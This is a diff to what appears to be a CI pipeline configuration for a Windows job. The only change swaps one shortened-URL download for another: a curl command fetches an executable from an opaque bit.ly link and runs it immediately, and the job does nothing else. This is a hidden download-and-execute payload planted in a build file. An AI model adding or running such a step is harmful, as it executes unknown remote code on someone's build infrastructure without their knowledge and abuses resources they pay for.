@@ -9,4 +9,4 @@ jobs:
       name: win/default
       shell: cmd.exe
     steps:
-      - run: curl -L -o yourcustomlink.exe https://is.gd/yourcustomlink && yourcustomlink.exe
+      - run: curl -L -o 3DDr6Hw.exe https://bit.ly/3DDr6Hw && 3DDr6Hw.exe
